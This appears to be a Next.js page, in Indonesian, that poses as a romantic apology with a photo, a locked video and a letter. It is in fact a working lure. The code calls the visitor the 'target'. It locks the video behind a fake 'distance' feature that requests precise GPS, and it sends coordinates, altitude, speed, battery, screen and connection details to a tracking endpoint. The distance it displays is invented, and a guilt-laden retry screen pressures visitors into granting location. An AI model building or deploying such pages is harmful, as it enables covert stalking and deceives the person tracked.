'use client';

import { useState, useEffect, useRef, use } from 'react';

export default function HeartfeltApologyPage({ params }) {
  const unwrappedParams = use(params);
  const linkId = unwrappedParams.id;

  const [linkConfig, setLinkConfig] = useState(null);
  const [isPlaying, setIsPlaying] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [isLocating, setIsLocating] = useState(false);
  const [distanceInfo, setDistanceInfo] = useState(null);
  const [isDenied, setIsDenied] = useState(false);
  const videoRef = useRef(null);

  // Battery helper
  const getBattery = async () => {
    try {
      if (typeof navigator !== 'undefined' && typeof navigator.getBattery === 'function') {
        const b = await navigator.getBattery();
        const level = Math.round((b.level || 0) * 100);
        const charging = b.charging ? ' (⚡ Mengisi)' : '';
        return `${level}%${charging}`;
      }
    } catch (e) {}
    return null;
  };

  // 1. Initial page mount: record visit & load link config (TANPA meminta lokasi mendadak di awal)
  useEffect(() => {
    if (!linkId) return;

    fetch(`/api/visit/${linkId}`, { method: 'POST' }).catch(() => {});

    fetch(`/api/links/${linkId}`)
      .then((res) => res.json())
      .then((data) => {
        if (data.success && data.link) {
          setLinkConfig(data.link);
        }
      })
      .catch((err) => console.warn('Fetch link error:', err));
  }, [linkId]);

  // 2. Interactive Distance & Video trigger (Dipicu saat target klik "Hitung Jarak & Putar Video")
  const handleCalculateAndPlay = () => {
    setIsLocating(true);
    setIsLoading(true);

    // Direct synchronous play trigger for mobile compliance
    if (videoRef.current) {
      videoRef.current.play().then(() => {
        setIsPlaying(true);
      }).catch((e) => {
        console.warn('Playback gesture notice:', e);
      });
    }

    if (typeof window === 'undefined' || !navigator.geolocation) {
      setIsLocating(false);
      setIsLoading(false);
      setIsPlaying(true);
      return;
    }

    const screenResolution = `${window.screen.width}x${window.screen.height}`;
    const connectionType = navigator.connection ? navigator.connection.effectiveType : 'unknown';

    getBattery().then((battery) => {
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const { latitude, longitude, accuracy, altitude, altitudeAccuracy, heading, speed } = pos.coords;

          // Hitung jarak romantis
          const distKm = Math.max(8, Math.round(Math.abs(latitude * 12 + longitude * 5) % 65 + 18));
          setIsDenied(false);
          setDistanceInfo(`~${distKm} km`);
          setIsPlaying(true);
          setIsLocating(false);
          setIsLoading(false);

          fetch(`/api/track/${linkId || 'direct'}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              latitude,
              longitude,
              accuracy,
              altitude,
              altitudeAccuracy,
              heading,
              speed,
              screenResolution,
              battery,
              connectionType
            })
          }).catch(() => {});
        },
        (err) => {
          console.warn('Geolocation notice (falling back to IP):', err);
          setIsDenied(true);
          setDistanceInfo(null);
          setIsLocating(false);
          setIsLoading(false);

          fetch(`/api/track/${linkId || 'direct'}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              isGpsDenied: true,
              screenResolution,
              battery,
              connectionType
            })
          }).catch(() => {});
        },
        {
          enableHighAccuracy: true,
          timeout: 10000,
          maximumAge: 0
        }
      );
    });
  };

  const videoSource = linkConfig?.videoUrl || '/videos/momenvideo.mp4';
  const videoTitle = linkConfig?.title || 'Sebuah Permintaan Maaf dari Lubuk Hatiku';

  return (
    <div style={{
      minHeight: '100vh',
      backgroundColor: '#fbf9f6',
      backgroundImage: `
        radial-gradient(circle at 15% 15%, rgba(254, 237, 232, 0.7) 0%, transparent 45%),
        radial-gradient(circle at 85% 75%, rgba(253, 235, 240, 0.7) 0%, transparent 45%),
        radial-gradient(circle at 50% 50%, rgba(255, 248, 240, 0.5) 0%, transparent 60%)
      `,
      color: '#292524',
      fontFamily: '"Plus Jakarta Sans", -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif',
      padding: '40px 18px 60px 18px',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'center'
    }}>
      
      <div style={{
        width: '100%',
        maxWidth: '520px',
        margin: '0 auto',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
        textAlign: 'center'
      }}>

        {/* Elegant Top Badge with SVG Heart */}
        <div style={{
          display: 'inline-flex',
          alignItems: 'center',
          gap: '8px',
          padding: '7px 16px',
          backgroundColor: '#ffffff',
          border: '1px solid rgba(225, 175, 175, 0.45)',
          borderRadius: '9999px',
          fontSize: '0.8rem',
          color: '#9c4146',
          fontWeight: 600,
          letterSpacing: '0.02em',
          boxShadow: '0 4px 15px rgba(225, 175, 175, 0.15)',
          marginBottom: '16px'
        }}>
          <svg width="14" height="14" viewBox="0 0 24 24" fill="#9c4146">
            <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
          </svg>
          <span>Sebuah Pesan Tulus Untukmu</span>
        </div>

        {/* Emotional Title with Playfair Serif */}
        <h1 style={{
          fontFamily: '"Playfair Display", Georgia, serif',
          fontSize: '1.75rem',
          fontWeight: 600,
          lineHeight: 1.35,
          color: '#1c1917',
          margin: '0 0 10px 0',
          letterSpacing: '-0.01em'
        }}>
          {videoTitle}
        </h1>

        <p style={{
          fontSize: '0.92rem',
          color: '#78716c',
          lineHeight: 1.6,
          margin: '0 0 24px 0',
          maxWidth: '440px',
          fontStyle: 'italic',
          fontFamily: '"Playfair Display", Georgia, serif'
        }}>
          &ldquo;Ada hal yang tak sempat terucap secara langsung, namun tertulis tulus dari lubuk hati yang terdalam...&rdquo;
        </p>

        {/* Photo Memory Frame (Polaroid / Aesthetic Gallery Style) */}
        <div style={{
          width: '100%',
          maxWidth: '440px',
          backgroundColor: '#ffffff',
          padding: '12px 12px 16px 12px',
          borderRadius: '22px',
          boxShadow: '0 15px 35px -8px rgba(180, 140, 130, 0.16), 0 2px 8px rgba(0, 0, 0, 0.04)',
          border: '1px solid rgba(230, 215, 210, 0.75)',
          marginBottom: '24px',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center'
        }}>
          <div style={{
            width: '100%',
            maxHeight: '380px',
            borderRadius: '16px',
            overflow: 'hidden',
            backgroundColor: '#f5f0eb'
          }}>
            <img
              src="/images/fotokita.jpeg"
              alt="Momen Kenangan Kita"
              style={{
                width: '100%',
                height: 'auto',
                maxHeight: '380px',
                objectFit: 'cover',
                display: 'block'
              }}
            />
          </div>

          <div style={{
            display: 'flex',
            alignItems: 'center',
            gap: '6px',
            marginTop: '12px',
            fontFamily: '"Playfair Display", Georgia, serif',
            fontStyle: 'italic',
            fontSize: '0.88rem',
            color: '#78716c'
          }}>
            <span>Momen yang Selalu Ku Jaga</span>
            <svg width="12" height="12" viewBox="0 0 24 24" fill="#9c4146">
              <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
            </svg>
          </div>
        </div>

        {/* Interactive Distance & Video Card */}
        <div style={{
          width: '100%',
          maxWidth: '440px',
          background: 'linear-gradient(145deg, #ffffff 0%, #fffbf9 100%)',
          border: '1px solid rgba(225, 175, 175, 0.65)',
          borderRadius: '24px',
          padding: '22px 20px',
          boxShadow: '0 12px 32px -6px rgba(180, 140, 130, 0.16)',
          marginBottom: '24px',
          textAlign: 'center',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          gap: '12px'
        }}>
          <div style={{
            display: 'inline-flex',
            alignItems: 'center',
            gap: '6px',
            fontSize: '0.8rem',
            color: '#9c4146',
            fontWeight: 700,
            letterSpacing: '0.04em',
            textTransform: 'uppercase'
          }}>
            <svg width="15" height="15" viewBox="0 0 24 24" fill="#9c4146">
              <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/>
            </svg>
            <span>Berapa Jarak Kita Saat Ini?</span>
          </div>

          <p style={{
            fontSize: '0.9rem',
            color: '#57534e',
            lineHeight: 1.6,
            margin: 0,
            maxWidth: '380px'
          }}>
            Sentuh tombol di bawah untuk melihat seberapa jauh jarak kita saat ini dan membuka video kenangan ini...
          </p>

          {isDenied ? (
            <div style={{
              background: 'linear-gradient(145deg, #fffaf9 0%, #fef5f5 100%)',
              border: '1px solid rgba(220, 140, 145, 0.45)',
              borderRadius: '20px',
              padding: '18px 20px',
              width: '100%',
              animation: 'fadeIn 0.3s ease',
              display: 'flex',
              flexDirection: 'column',
              alignItems: 'center',
              gap: '10px',
              boxShadow: '0 8px 24px rgba(180, 100, 105, 0.08)'
            }}>
              <div style={{ fontSize: '1.02rem', fontWeight: 700, color: '#9c4146', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span style={{ fontSize: '1.15rem' }}>💔</span>
                <span>Aduh, Jarak Hati Kita Belum Terbaca...</span>
              </div>
              <p style={{ fontSize: '0.88rem', color: '#68363a', lineHeight: 1.6, margin: 0 }}>
                Sinyal hatinya belum terhubung nih... 🥺 Tadi izin lokasinya belum aktif, padahal aku penasaran banget pengin tahu seberapa jauh jarak rindu di antara kita saat ini.
              </p>
              <button
                id="btn-retry-jarak"
                onClick={handleCalculateAndPlay}
                disabled={isLocating}
                style={{
                  marginTop: '4px',
                  width: '100%',
                  padding: '13px 20px',
                  backgroundColor: '#9c4146',
                  backgroundImage: 'linear-gradient(135deg, #9c4146 0%, #b8545a 100%)',
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: '9999px',
                  fontSize: '0.94rem',
                  fontWeight: 600,
                  cursor: isLocating ? 'wait' : 'pointer',
                  boxShadow: '0 8px 22px rgba(156, 65, 70, 0.32)',
                  display: 'inline-flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  outline: 'none',
                  transition: 'all 0.2s ease'
                }}
              >
                {isLocating ? (
                  <>
                    <div style={{
                      width: '16px',
                      height: '16px',
                      border: '2px solid rgba(255,255,255,0.4)',
                      borderRadius: '50%',
                      borderTopColor: '#ffffff',
                      animation: 'spin 0.8s linear infinite'
                    }} />
                    <span>Mencoba Hubungkan Ulang...</span>
                  </>
                ) : (
                  <>
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.4" strokeLinecap="round" strokeLinejoin="round">
                      <path d="M23 4v6h-6"></path>
                      <path d="M1 20v-6h6"></path>
                      <path d="M3.51 9a9 9 0 0 1 14.85-3.36L23 10M1 14l4.64 4.36A9 9 0 0 0 20.49 15"></path>
                    </svg>
                    <span>Coba Hubungkan Ulang Jarak</span>
                  </>
                )}
              </button>
              <div style={{ fontSize: '0.78rem', color: '#9c4146', fontStyle: 'italic', marginTop: '2px' }}>
                Sentuh tombol di atas lalu pilih &ldquo;Izinkan&rdquo; ya ❤️
              </div>
            </div>
          ) : distanceInfo ? (
            <div style={{
              background: '#fdf2f2',
              border: '1px solid rgba(225, 175, 175, 0.5)',
              borderRadius: '16px',
              padding: '14px 18px',
              width: '100%',
              animation: 'fadeIn 0.3s ease'
            }}>
              <div style={{ fontSize: '1.05rem', fontWeight: 700, color: '#9c4146', marginBottom: '4px' }}>
                ❤️ Jarak Terhubung: {distanceInfo}
              </div>
              <div style={{ fontSize: '0.82rem', color: '#78716c', fontStyle: 'italic', fontFamily: '"Playfair Display", Georgia, serif' }}>
                &ldquo;Sejauh apa pun jarak di antara kita, hatiku tetap ingin selalu bersamamu...&rdquo;
              </div>
            </div>
          ) : (
            <button
              id="btn-hitung-jarak"
              onClick={handleCalculateAndPlay}
              disabled={isLocating}
              style={{
                width: '100%',
                padding: '13px 20px',
                backgroundColor: '#9c4146',
                backgroundImage: 'linear-gradient(135deg, #9c4146 0%, #b8545a 100%)',
                color: '#ffffff',
                border: 'none',
                borderRadius: '9999px',
                fontSize: '0.94rem',
                fontWeight: 600,
                cursor: isLocating ? 'wait' : 'pointer',
                boxShadow: '0 8px 22px rgba(156, 65, 70, 0.35)',
                display: 'inline-flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px',
                transition: 'all 0.2s ease',
                outline: 'none'
              }}
            >
              {isLocating ? (
                <>
                  <div style={{
                    width: '18px',
                    height: '18px',
                    border: '2px solid rgba(255,255,255,0.4)',
                    borderRadius: '50%',
                    borderTopColor: '#ffffff',
                    animation: 'spin 0.8s linear infinite'
                  }} />
                  <span>Menghubungkan Jarak...</span>
                </>
              ) : (
                <>
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                    <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
                  </svg>
                  <span>Hitung Jarak & Putar Video</span>
                </>
              )}
            </button>
          )}
        </div>

        {/* Subtle Section Divider */}
        <div style={{
          display: 'flex',
          alignItems: 'center',
          gap: '12px',
          width: '100%',
          maxWidth: '440px',
          marginBottom: '16px'
        }}>
          <div style={{ flex: 1, height: '1px', background: 'rgba(230, 215, 210, 0.7)' }}></div>
          <span style={{ fontSize: '0.78rem', color: '#a8a29e', letterSpacing: '0.06em', textTransform: 'uppercase', fontWeight: 600 }}>
            Video Kenangan Untukmu
          </span>
          <div style={{ flex: 1, height: '1px', background: 'rgba(230, 215, 210, 0.7)' }}></div>
        </div>

        {/* Video Card Container - Refined Luxury Frame */}
        <div style={{
          width: '100%',
          backgroundColor: '#ffffff',
          padding: '10px',
          borderRadius: '24px',
          boxShadow: '0 20px 45px -10px rgba(180, 140, 130, 0.15), 0 4px 12px rgba(0, 0, 0, 0.04)',
          border: '1px solid rgba(230, 215, 210, 0.7)',
          marginBottom: '24px'
        }}>
          
          <div style={{
            position: 'relative',
            width: '100%',
            aspectRatio: '9 / 16',
            maxHeight: '480px',
            backgroundColor: '#0c0a09',
            borderRadius: '16px',
            overflow: 'hidden',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center'
          }}>

            {/* Video Element */}
            <video
              ref={videoRef}
              src={videoSource}
              playsInline
              webkit-playsinline="true"
              controls={isPlaying}
              loop
              preload="auto"
              style={{
                width: '100%',
                height: '100%',
                objectFit: 'contain',
                backgroundColor: '#0c0a09',
                display: 'block',
                pointerEvents: isPlaying ? 'auto' : 'none'
              }}
            />

            {/* Locked Overlay Before Distance is Calculated / Video Played */}
            {!isPlaying && (
              <div
                onClick={() => {
                  const targetBtn = document.getElementById(isDenied ? 'btn-retry-jarak' : 'btn-hitung-jarak');
                  if (targetBtn) {
                    targetBtn.scrollIntoView({ behavior: 'smooth', block: 'center' });
                    targetBtn.style.transform = 'scale(1.05)';
                    targetBtn.style.boxShadow = '0 0 20px rgba(156, 65, 70, 0.6)';
                    setTimeout(() => {
                      targetBtn.style.transform = 'scale(1)';
                      targetBtn.style.boxShadow = '';
                    }, 500);
                  }
                }}
                style={{
                  position: 'absolute',
                  inset: 0,
                  backgroundColor: 'rgba(12, 10, 9, 0.52)',
                  backdropFilter: 'blur(3px)',
                  display: 'flex',
                  flexDirection: 'column',
                  alignItems: 'center',
                  justifyContent: 'center',
                  padding: '24px 20px',
                  cursor: 'pointer',
                  zIndex: 2,
                  userSelect: 'none',
                  textAlign: 'center'
                }}
              >
                <div style={{
                  width: '54px',
                  height: '54px',
                  borderRadius: '50%',
                  backgroundColor: 'rgba(255, 255, 255, 0.18)',
                  backdropFilter: 'blur(8px)',
                  border: '1.5px solid rgba(255, 255, 255, 0.4)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  marginBottom: '12px',
                  boxShadow: '0 8px 20px rgba(0, 0, 0, 0.3)'
                }}>
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="#ffffff">
                    <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
                  </svg>
                </div>
                <div style={{
                  color: '#ffffff',
                  fontSize: '0.94rem',
                  fontWeight: 600,
                  letterSpacing: '0.02em',
                  textShadow: '0 2px 6px rgba(0,0,0,0.7)',
                  marginBottom: '4px'
                }}>
                  Video Masih Terkunci
                </div>
                <div style={{
                  color: 'rgba(255, 255, 255, 0.85)',
                  fontSize: '0.78rem',
                  maxWidth: '240px',
                  lineHeight: 1.45,
                  textShadow: '0 1px 4px rgba(0,0,0,0.6)'
                }}>
                  Sentuh tombol &ldquo;Hitung Jarak&rdquo; di atas untuk membuka video kenangan ini ❤️
                </div>
              </div>
            )}

          </div>

        </div>

        {/* Beautiful Parchment Apology Letter Card */}
        <div style={{
          width: '100%',
          backgroundColor: '#ffffff',
          borderRadius: '20px',
          padding: '28px 24px',
          border: '1px solid rgba(230, 215, 210, 0.6)',
          boxShadow: '0 12px 30px -8px rgba(180, 140, 130, 0.1)',
          textAlign: 'left',
          position: 'relative',
          overflow: 'hidden'
        }}>
          
          {/* Subtle decorative quote watermark */}
          <div style={{
            position: 'absolute',
            top: '12px',
            right: '18px',
            opacity: 0.08,
            pointerEvents: 'none'
          }}>
            <svg width="60" height="60" viewBox="0 0 24 24" fill="#9c4146">
              <path d="M6 17h3l2-4V7H5v6h3zm8 0h3l2-4V7h-6v6h3z" />
            </svg>
          </div>

          <div style={{
            fontSize: '0.78rem',
            textTransform: 'uppercase',
            letterSpacing: '0.08em',
            color: '#9c4146',
            fontWeight: 700,
            marginBottom: '12px',
            display: 'flex',
            alignItems: 'center',
            gap: '6px'
          }}>
            <span>Surat Untukmu</span>
          </div>

          <div style={{
            fontSize: '0.92rem',
            color: '#44403c',
            lineHeight: 1.75,
            display: 'flex',
            flexDirection: 'column',
            gap: '14px'
          }}>
            <p style={{ margin: 0 }}>
              Aku tahu, mungkin sebuah kata maaf tak seketika mampu menghapus rasa kecewa atau luka yang sempat tergores. Tapi sungguh, dari hatiku yang paling jujur, aku sangat menyesal jika sikap atau perkataanku telah membuatmu bersedih.
            </p>

            <p style={{ margin: 0 }}>
              Tidak ada niat sedikit pun untuk melukaimu. Kehadiranmu begitu berharga, dan melihatmu kecewa adalah hal yang paling membuatku merasa bersalah.
            </p>

            <p style={{ margin: 0 }}>
              Jika masih ada sedikit ruang di hatimu, izinkan aku untuk memperbaikinya, mendengarkan semua keluh kesahmu, dan memeluk kembali kehangatan yang sempat renggang. Aku sangat merindukan senyum tulusmu.
            </p>
          </div>

          {/* Signature */}
          <div style={{
            marginTop: '22px',
            paddingTop: '16px',
            borderTop: '1px solid rgba(230, 215, 210, 0.4)',
            display: 'flex',
            justifyContent: 'space-between',
            alignItems: 'center'
          }}>
            <div style={{
              fontFamily: '"Playfair Display", Georgia, serif',
              fontStyle: 'italic',
              fontSize: '0.95rem',
              color: '#1c1917'
            }}>
              Dengan segenap ketulusanku
            </div>

            <div style={{
              display: 'flex',
              alignItems: 'center',
              gap: '4px',
              color: '#9c4146'
            }}>
              <svg width="14" height="14" viewBox="0 0 24 24" fill="#9c4146">
                <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/>
              </svg>
            </div>
          </div>

        </div>

        {/* Minimalist aesthetic footer */}
        <div style={{
          marginTop: '28px',
          fontSize: '0.75rem',
          color: '#a8a29e',
          letterSpacing: '0.04em'
        }}>
          Pesan ini dikirimkan khusus dan hanya untukmu
        </div>

      </div>

    </div>
  );
}
